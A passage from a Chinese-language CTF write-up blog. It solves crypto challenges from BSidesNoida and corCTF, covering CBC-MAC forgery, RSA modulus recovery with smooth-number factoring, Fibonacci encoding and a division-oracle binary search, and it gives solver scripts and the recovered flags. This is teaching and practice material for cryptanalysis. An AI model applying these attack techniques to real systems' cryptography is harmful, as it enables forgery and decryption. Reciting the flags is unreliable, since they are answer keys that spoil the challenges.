&quot;</span>).strip()</span><br><span class="line">                AUTH(tag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] Invalid Choice&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;:( Oops!&quot;</span>, e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Terminating Session!&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Why are MACAWS becoming Another Endangered Species?</span><br></pre></td></tr></table></figure>

<p>AES，CBC；拿出DAS签到的图                                           </p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210810163522657.png" alt="image-20210810163522657"/>

<p>嗯？这种题目，50Solves？</p>
<p>只要<code>data == secret_msg</code>就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> data != secret_msg, <span class="string">&quot;Not Allowed!!!&quot;</span></span><br></pre></td></tr></table></figure>

<p>那么显然看主函数的第一段，secret_msg就是<code>Welcome to BSidesNoida!! Follow us on Twitter...</code>，然后转一下十六进制编码；不是很懂代码的逻辑，但是将得到的tag发过去就得到flag了<code>BSNoida&#123;M4c4w5_4r3_4d0r4b13&#125;</code></p>
<p>a few moments later</p>
<p>我收回我刚才的话，上面的分析是不对的，不是只要<code>data == secret_msg</code>就好了，而是要<code>data != secret_msg</code>，但真正的secret_msg还有一个<code>/n</code>，而且如果加上<code>\n</code>又不满足第一个条件</p>
<p>所以综上，不知道是出题人有意为之，还是无心插柳，被我瞎jb搞出来了，也可以称得上是签到题吧（为了证明我搞出来我flag破例给出了;)）</p>
<h3 id="Crypto-Macaw-Revenge"><a href="#Crypto-Macaw-Revenge" class="headerlink" title="Crypto-Macaw_Revenge"></a>Crypto-Macaw_Revenge</h3><p>好吧，原来是为这道题做铺垫</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    FLAG = f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">/===== MENU =====\\</span></span><br><span class="line"><span class="string">|                |</span></span><br><span class="line"><span class="string">|  [M] MAC Gen   |</span></span><br><span class="line"><span class="string">|  [A] AUTH      |</span></span><br><span class="line"><span class="string">|                |</span></span><br><span class="line"><span class="string">\================/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MAC</span>(<span class="params">data, check=<span class="literal">False</span></span>):</span>    </span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) % <span class="number">16</span> == <span class="number">0</span>, <span class="string">&quot;Invalid Input&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> check:</span><br><span class="line">        <span class="keyword">assert</span> data != secret_msg, <span class="string">&quot;Not Allowed!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    tag = cipher.encrypt(data)[-<span class="number">16</span>:]</span><br><span class="line">    <span class="keyword">return</span> tag.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AUTH</span>(<span class="params">tag</span>):</span></span><br><span class="line">    <span class="keyword">if</span> tag == secret_tag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Successfully Verified!\n[-] Details:&quot;</span>, FLAG)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Verification Flaied !!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    key = os.urandom(<span class="number">16</span>)</span><br><span class="line">    secret_msg = os.urandom(<span class="number">48</span>)</span><br><span class="line">    secret_tag = MAC(secret_msg)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Forbidden msg: <span class="subst">&#123;secret_msg.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="built_in">print</span>(menu)</span><br><span class="line">            ch = <span class="built_in">input</span>(<span class="string">&quot;[?] Choice: &quot;</span>).strip().upper()</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">                data = <span class="built_in">input</span>(<span class="string">&quot;[+] Enter plaintext(hex): &quot;</span>).strip()</span><br><span class="line">                tag = MAC(<span class="built_in">bytes</span>.fromhex(data), check=<span class="literal">True</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Generated tag:&quot;</span>, tag)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] iv:&quot;</span>, iv.<span class="built_in">hex</span>())</span><br><span class="line">            <span class="keyword">elif</span> ch == <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">                tag = <span class="built_in">input</span>(<span class="string">&quot;[+] Enter your tag to verify: &quot;</span>).strip()</span><br><span class="line">                AUTH(tag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] Invalid Choice&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;:( Oops!&quot;</span>, e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Terminating Session!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>上面那张图没有白拿，考点CBC，无攻击手法，完全是对流程图的改造</p>
<p>有两种做法，用pwntools交互还是有点头疼，做的时候直接手撕了</p>
<p>这是第一次<code>secret_tag = MAC(secret_msg)</code>的流程</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/AES_CBC.png" alt="AES_CBC"></p>
<p>已知明文，要求密文块2；如果我们能得到第三次加密偏移量IV’，这样放进AES加密就能得到密文块2</p>
<p>第一种做法</p>
<p>第一次送明文块0去异或，将得到的<strong>密文块0</strong>与<strong>已知的IV</strong>以及<strong>明文块1</strong>异或，再将得到的结果拼接上明文块2送去AES加密，将得到密文块2在第三次verify时输入，得到flag</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/AES_CBC_attack.png" alt="AES_CBC_attack"></p>
<p>还有一种做法类似，将明文块0和1和起来进行第一次加密</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/AES_CBC_attack2.png" alt="AES_CBC_attack2"></p>
<p>脚本写的太丑就不展示了</p>
<p>块密码还是挺有趣的，不要像之前的我一样，因为不懂DES和AES的加密流程就放弃做题而被拒之门外</p>
<h3 id="Crypto-baby-crypto"><a href="#Crypto-baby-crypto" class="headerlink" title="Crypto-baby_crypto"></a>Crypto-baby_crypto</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> token_bytes</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	a = getPrime(<span class="number">512</span>)</span><br><span class="line">	b = reduce(mul, [getPrime(<span class="number">64</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)])</span><br><span class="line">	flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">	flag_int = bytes_to_long(flag + token_bytes(<span class="number">20</span>))</span><br><span class="line">	<span class="keyword">if</span> flag_int &gt; b:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;this was not supposed to happen&quot;</span>)</span><br><span class="line">		exit()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Try decrypting this =&gt;&quot;</span>, <span class="built_in">pow</span>(flag_int, a, b))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Hint =&gt;&quot;</span>, a)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Thanks for helping me test this out,&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Now try to break it&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">		inp = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>))</span><br><span class="line">		<span class="keyword">if</span> inp % b <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>, b - <span class="number">1</span>]:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;No cheating &gt;:(&quot;</span>)</span><br><span class="line">			exit()</span><br><span class="line">		res = <span class="built_in">pow</span>(flag_int, inp * a, b)</span><br><span class="line">		<span class="built_in">print</span>(res)</span><br><span class="line">		<span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">			<span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		main()</span><br><span class="line">	<span class="keyword">except</span> Exception:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;oopsie&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>很像RSA的n未知，随便搜了一下，在wiki上搜到<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_chosen_plain_cipher/">RSA选择明文攻击</a>，很好懂</p>
<p>现在摆在我们面前的就有两条路子，因为只能循环两遍，所以用了选择明文攻击后，就不能继续按照题目的思路将res变成1了</p>
<p>我更喜欢直接点打</p>
<p>只要b能出来，绝对可以得到很好的分解，虽然这次factordb没有分解出来（分解不了光滑数我实在没想到），但是yafu和椭圆曲线分解都出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">20203085489987560014293976792631284029865794716340199579184268249383267835221417646400206440280554986191046482410144704655493648278552773961629440429092902828200586765600142014056717474264892592819336816357109261631354026033919601</span></span><br><span class="line">a = <span class="number">9199145544343906785257237030819067819650706729960940719583789075672838085664891493875966859020683165873915514690329495098632224089726035146839813982911647</span></span><br><span class="line">res1 = <span class="number">11556035784052138857307507506198973288367411883788209466242603646975181772393709048116382813114147667439254757077994923530326940311774811806341624846606432421390147764067475588289999480688178793625567838893122456687987320482961046</span></span><br><span class="line">res2 = <span class="number">31851104354654545190670904771335276903093012765843101980283420984000643289499190154554669289569530261009163188908584430876887966331849339667406478926717953660650120468017201255286785290943940825754781159249398489654218469154878634</span></span><br><span class="line"><span class="comment"># b = gcd(c**2-res1, c**3-res2)</span></span><br><span class="line">b = <span class="number">35928904747031491940426212169291743107379982701504027058404714745969854722708017688279836779414010447803620033738718602141821905862755021890356381265244649437631255336699627199559173294827426763360743177116198238833752565119866603</span></span><br><span class="line">p1 = <span class="number">9663156357322877677</span></span><br><span class="line">p2 = <span class="number">17687198236208397641</span></span><br><span class="line">p3 = <span class="number">13483379498110779557</span></span><br><span class="line">p4 = <span class="number">9827362203600815249</span></span><br><span class="line">p5 = <span class="number">16048195073366111129</span></span><br><span class="line">p6 = <span class="number">9608504155966563959</span></span><br><span class="line">p7 = <span class="number">17592003464121633761</span></span><br><span class="line">p8 = <span class="number">16940133308409174757</span></span><br><span class="line">p9 = <span class="number">10013743477508178887</span></span><br><span class="line">p10 = <span class="number">18085688756284030699</span></span><br><span class="line">p11 = <span class="number">15237723747921143731</span></span><br><span class="line">p12 = <span class="number">12510206954070273583</span></span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">    p.append(<span class="built_in">eval</span>(<span class="string">&#x27;p&#x27;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line"><span class="keyword">assert</span> b == reduce(mul, [_ <span class="keyword">for</span> _ <span class="keyword">in</span> p])</span><br><span class="line">phi = reduce(mul, [_-<span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> p])</span><br><span class="line">d = invert(a, phi)</span><br><span class="line">flag_int = long_to_bytes(<span class="built_in">pow</span>(c, d, b))</span><br><span class="line"><span class="built_in">print</span>(flag_int)</span><br></pre></td></tr></table></figure>

<p>别的思路我没有尝试了</p>
<p>扪心自问，这种题目才22解吗？看来参赛选手不多</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些题目做得爽快啊，虽然不长，但是考点很灵活，但是即使比赛结束还是有复现的必要的，趁着靶机没关；但是国内的题目，密码学少的可怜，要混口饭吃还是得学pwn</p>
<p>还有学到了歪果仁还很喜欢的一种字节与十六进制编码的转化，以及用pwntools里的xor进行字节的异或操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">xor(<span class="built_in">bytes</span>.fromhex(STRING1), <span class="built_in">bytes</span>.fromhex(STRING2)).<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210821 corCTF YauzaCTFCrypto&amp;OISNT方向部分WP</title>
    <url>/posts/493b5ffc/</url>
    <content><![CDATA[<p>熟悉的界面，赛后复现，前两天有祥云杯</p>
<p>看到好多师傅都给全a了</p>
<span id="more"></span>

<h1 id="corCTF"><a href="#corCTF" class="headerlink" title="corCTF"></a>corCTF</h1><h2 id="Crypto-fibinary"><a href="#Crypto-fibinary" class="headerlink" title="Crypto-fibinary"></a>Crypto-fibinary</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fib = [<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">11</span>):</span><br><span class="line">	fib.append(fib[i - <span class="number">1</span>] + fib[i - <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c2f</span>(<span class="params">c</span>):</span></span><br><span class="line">	n = <span class="built_in">ord</span>(c)</span><br><span class="line">	b = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> n &gt;= fib[i]:</span><br><span class="line">			n -= fib[i]</span><br><span class="line">			b += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			b += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">enc = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> flag:</span><br><span class="line">	enc += c2f(c) + <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(enc.strip())</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">10000100100 10010000010 10010001010 10000100100 10010010010 10001000000 10100000000 10000100010 00101010000 10010010000 00101001010 10000101000 10000010010 00101010000 10010000000 10000101000 10000010010 10001000000 00101000100 10000100010 10010000100 00010101010 00101000100 00101000100 00101001010 10000101000 10100000100 00000100100</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fib = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>]</span><br><span class="line">enc = <span class="string">&#x27;10000100100 10010000010 10010001010 10000100100 10010010010 10001000000 10100000000 10000100010 00101010000 10010010000 00101001010 10000101000 10000010010 00101010000 10010000000 10000101000 10000010010 10001000000 00101000100 10000100010 10010000100 00010101010 00101000100 00101000100 00101001010 10000101000 10100000100 00000100100&#x27;</span></span><br><span class="line">enc = enc.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fib)):</span><br><span class="line">        <span class="keyword">if</span> i[j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            n += fib[<span class="built_in">len</span>(fib)-j-<span class="number">1</span>]</span><br><span class="line">    flag += <span class="built_in">chr</span>(n)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>corctf{b4s3d_4nd_f1bp!113d}</p>
</blockquote>
<h2 id="Crypto-4096"><a href="#Crypto-4096" class="headerlink" title="Crypto-4096"></a>Crypto-4096</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> private <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prod</span>(<span class="params">lst</span>):</span></span><br><span class="line">	ret = <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> lst:</span><br><span class="line">		ret *= num</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">primes = [getPrime(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line">n = prod(primes)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">n = <span class="number">50630448182626893495464810670525602771527685838257974610483435332349728792396826591558947027657819590790590829841808151825744184405725893984330719835572507419517069974612006826542638447886105625739026433810851259760829112944769101557865474935245672310638931107468523492780934936765177674292815155262435831801499197874311121773797041186075024766460977392150443756520782067581277504082923534736776769428755807994035936082391356053079235986552374148782993815118221184577434597115748782910244569004818550079464590913826457003648367784164127206743005342001738754989548942975587267990706541155643222851974488533666334645686774107285018775831028090338485586011974337654011592698463713316522811656340001557779270632991105803230612916547576906583473846558419296181503108603192226769399675726201078322763163049259981181392937623116600712403297821389573627700886912737873588300406211047759637045071918185425658854059386338495534747471846997768166929630988406668430381834420429162324755162023168406793544828390933856260762963763336528787421503582319435368755435181752783296341241853932276334886271511786779019664786845658323166852266264286516275919963650402345264649287569303300048733672208950281055894539145902913252578285197293</span></span><br><span class="line">c = <span class="number">15640629897212089539145769625632189125456455778939633021487666539864477884226491831177051620671080345905237001384943044362508550274499601386018436774667054082051013986880044122234840762034425906802733285008515019104201964058459074727958015931524254616901569333808897189148422139163755426336008738228206905929505993240834181441728434782721945966055987934053102520300610949003828413057299830995512963516437591775582556040505553674525293788223483574494286570201177694289787659662521910225641898762643794474678297891552856073420478752076393386273627970575228665003851968484998550564390747988844710818619836079384152470450659391941581654509659766292902961171668168368723759124230712832393447719252348647172524453163783833358048230752476923663730556409340711188698221222770394308685941050292404627088273158846156984693358388590950279445736394513497524120008211955634017212917792675498853686681402944487402749561864649175474956913910853930952329280207751998559039169086898605565528308806524495500398924972480453453358088625940892246551961178561037313833306804342494449584581485895266308393917067830433039476096285467849735814999851855709235986958845331235439845410800486470278105793922000390078444089105955677711315740050638</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> factor(n):</span><br><span class="line">    phi *= i[<span class="number">0</span>]-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, phi), n)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>corctf{to0_m4ny_pr1m3s55_63aeea37a6b3b22f}</p>
</blockquote>
<h2 id="Crypto-dividing-secrets"><a href="#Crypto-dividing-secrets" class="headerlink" title="Crypto-dividing_secrets"></a>Crypto-dividing_secrets</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getStrongPrime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">LIMIT = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>():</span></span><br><span class="line">	p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">	g = randrange(<span class="number">1</span>, p)</span><br><span class="line">	<span class="keyword">return</span> g, p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	g, p = gen()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;g:&quot;</span>, <span class="built_in">str</span>(g))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;p:&quot;</span>, <span class="built_in">str</span>(p))</span><br><span class="line">	x = bytes_to_long(flag)</span><br><span class="line">	enc = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;encrypted flag:&quot;</span>, <span class="built_in">str</span>(enc))</span><br><span class="line">	ctr = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> ctr &lt; LIMIT:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			div = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;give me a number&gt; &quot;</span>))</span><br><span class="line">			<span class="built_in">print</span>(<span class="built_in">pow</span>(g, x // div, p))</span><br><span class="line">			ctr += <span class="number">1</span></span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;whoops..&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;no more tries left... bye&quot;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>以为我没有打祥云杯吗，可笑</p>
<p>直接二分法逼近</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nc crypto.be.ax 6000</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">l = <span class="number">10</span> ** <span class="number">153</span></span><br><span class="line">r = <span class="number">10</span> ** <span class="number">154</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;crypto.be.ax&#x27;</span>, <span class="number">6000</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;g: &#x27;</span>)</span><br><span class="line">    g = <span class="built_in">int</span>(sh.recvline())</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;p: &#x27;</span>)</span><br><span class="line">    p = <span class="built_in">int</span>(sh.recvline())</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;encrypted flag: &#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> l &lt; r:</span><br><span class="line">            sh.recvuntil(<span class="string">b&#x27;give me a number&gt;&#x27;</span>)</span><br><span class="line">            mid = (l + r) // <span class="number">2</span></span><br><span class="line">            sh.sendline(<span class="built_in">str</span>(mid).encode())</span><br><span class="line">            t = sh.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;corctf&#123;&#x27;</span> <span class="keyword">in</span> long_to_bytes(mid):</span><br><span class="line">                <span class="built_in">print</span>(long_to_bytes(mid))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(t.decode()) == <span class="number">1</span>:</span><br><span class="line">                r = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l = mid</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sh.close()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>corctf{qu4drat1c_r3s1due_0r_n0t_1s_7h3_qu3st1on8852042051e57492}</p>
</blockquote>
<p>但是看到flag，说是二次剩余，又是非预期？之前做InCTF的<a href="https://blog.csdn.net/m0_49109277/article/details/119841199?spm=1001.2014.3001.5501">Gold_digger</a>时，做到GM同态加密，其中就有用到二次剩余，二次非剩余</p>
<p>emmmmm非预期就非预期吧</p>
<h2 id="Crypto-supercomputer"><a href="#Crypto-supercomputer" class="headerlink" title="Crypto-supercomputer"></a>Crypto-supercomputer</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, binascii</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">v</span>(<span class="params">p, k</span>):</span></span><br><span class="line">	ans = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> k % p == <span class="number">0</span>:</span><br><span class="line">		k /= p</span><br><span class="line">		ans += <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">p, q, r = getPrime(<span class="number">2048</span>), getPrime(<span class="number">2048</span>), getPrime(<span class="number">2048</span>)</span><br><span class="line"><span class="built_in">print</span>(p, q, r)</span><br><span class="line">n = <span class="built_in">pow</span>(p, q) * r</span><br><span class="line"></span><br><span class="line">a1 = random.randint(<span class="number">0</span>, n)</span><br><span class="line">a2 = n - a1</span><br><span class="line"><span class="keyword">assert</span> a1 % p != <span class="number">0</span> <span class="keyword">and</span> a2 % p != <span class="number">0</span></span><br><span class="line"></span><br><span class="line">t = <span class="built_in">pow</span>(a1, n) + <span class="built_in">pow</span>(a2, n)</span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(xor(flag, long_to_bytes(v(p, t)))))</span><br></pre></td></tr></table></figure>

<p>简单的二项式展开，展到最后把指数最小的n给除完了，a1暴露出来，由于a1不是p的倍数，所以函数v中的循环条件不满足，循环结束</p>
